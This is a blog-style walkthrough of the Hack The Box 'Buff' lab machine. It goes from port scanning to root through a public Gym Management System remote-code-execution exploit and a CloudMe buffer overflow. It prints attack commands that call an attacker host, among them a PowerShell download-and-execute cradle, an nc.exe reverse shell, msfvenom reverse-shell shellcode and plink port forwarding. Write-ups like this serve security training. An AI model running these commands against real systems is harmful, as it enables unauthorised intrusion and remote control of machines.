---
layout: post
title: HTB Buff Walkthrough
categories: [HTB, OSCP]
---

As I was dedicated to place one box every day i was planning to put another box. I hit hard bottom for some reason exploit is not working and I have no clue how to move now. So i decide to take break on this machine and try break another one in few hours in night and try write blog about this. And here we are. Please enjoy this box as I did :)

![](/images/buff-htb/logo.png)

I started with simple nmap script

```bash
nmap -sC -sV -oA nmap/inital -Pn 10.10.10.198
# Nmap 7.91 scan initiated Mon Feb  1 22:17:42 2021 as: nmap -sC -sV -oA nmap/inital -Pn 10.10.10.198
Nmap scan report for 10.10.10.198
Host is up.
All 1000 scanned ports on 10.10.10.198 are filtered

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Feb  1 22:21:04 2021 -- 1 IP address (1 host up) scanned in 202.13 seconds
```

Scan did not show any ports which was really strange. Ok try nmap on all TCP ports

```bash
nmap -p - -oA nmap/allports -Pn 10.10.10.198
# Nmap 7.91 scan initiated Mon Feb  1 22:22:06 2021 as: nmap -p - -oA nmap/allports -Pn 10.10.10.198
Nmap scan report for 10.10.10.198
Host is up (0.15s latency).
Not shown: 65534 filtered ports
PORT     STATE SERVICE
8080/tcp open  http-proxy

# Nmap done at Mon Feb  1 22:27:07 2021 -- 1 IP address (1 host up) scanned in 301.37 seconds
```

One port open 8080 as http-proxy. I open firefox and navigate to this site on this port

![](/images/buff-htb/01-signature.png)

Website looks like CMS site but signature on this website was quite different.. Google for this name.

![](/images/buff-htb/02-gym-exploit.png)

Bingo! There is an exploit for it. Also check in searchsploit.

```bash
searchsploit gym management
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
Gym Management System 1.0 - 'id' SQL Injection                                     | php/webapps/48936.txt
Gym Management System 1.0 - Authentication Bypass                                  | php/webapps/48940.txt
Gym Management System 1.0 - Stored Cross Site Scripting                            | php/webapps/48941.txt
Gym Management System 1.0 - Unauthenticated Remote Code Execution                  | php/webapps/48506.py
----------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Unauthenticated Remote COde Execution? That sounds like gun i need :) 

```bash
python 48506.py http://10.10.10.198:8080/
            /\
/vvvvvvvvvvvv \--------------------------------------,
`^^^^^^^^^^^^ /============BOKU====================="
            \/

[+] Successfully connected to webshell.
C:\xampp\htdocs\gym\upload>
```

I was in. Tried to get proper shell now. *powershell -c "IEX(new-object net.webclient).downloadstring('http://10.10.14.9/shell.ps1')" *
did not work :/

```powershell
C:\xampp\htdocs\gym\upload> \\10.10.14.9\smb\nc.exe -e cmd.exe 10.10.14.9 9001
```

Try to run nishang shell now as i can see output. I also can just run -e with powershell.exe. 
```powershell
C:\xampp\htdocs\gym\upload>powershell -c "IEX(new-object net.webclient).downloadstring('http://10.10.14.9/shell.ps1')"
powershell -c "IEX(new-object net.webclient).downloadstring('http://10.10.14.9/shell.ps1')"
IEX : At line:1 char:1
+ function Invoke-PowerShellTcp
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.                              
At line:1 char:1
+ IEX(new-object net.webclient).downloadstring('http://10.10.14.9/shell ... 
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
     + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand
```

So it was AMSI that blocked me. Looking around home directory I found application called clouedme

```cmd
C:\Users\Administrator\Downloads>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A22D-49F7

 Directory of C:\Users\Administrator\Downloads

18/07/2020  16:36    <DIR>          .
18/07/2020  16:36    <DIR>          ..
16/06/2020  15:46        17,830,824 CloudMe_1112.exe
               1 File(s)     17,830,824 bytes
               2 Dir(s)   7,882,407,936 bytes free
```

Quick google search reveal that this version contain buffer overflow exploit. 

![](/images/buff-htb/03-bof-root.png)

i checked for first exploit. Looking for the exploit it need to connect on port 8888. 

```cmd
C:\Users\Administrator\Downloads>netstat -ano | findstr 8888      
netstat -ano | findstr 8888
  TCP    127.0.0.1:8888         0.0.0.0:0              LISTENING       756
```

Our exploit contain POC for pop-up calc on desktop which did not make any sense for us. We decide to change payload to reverse shell
```bash
msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.14.9 LPORT=9002 =b '\x00\x0A\x0D' -f python
```

Replace shellcode with new one generated. Now i need to expose localhost port me as i was not planning to install python on this machine. I used plink.exe. (there is an issue with plink.exe default on machine. Always download latest version from website)

PS C:\users\shaun\downloads> .\plink.exe -R 8888:127.0.0.1:8888 -P 4222 root@10.10.14.9

I had to use non standard port as HTB will not allow to connect on port 22.

After that just lunch me netcat session and execute python script

![](/images/buff-htb/04-root.png)
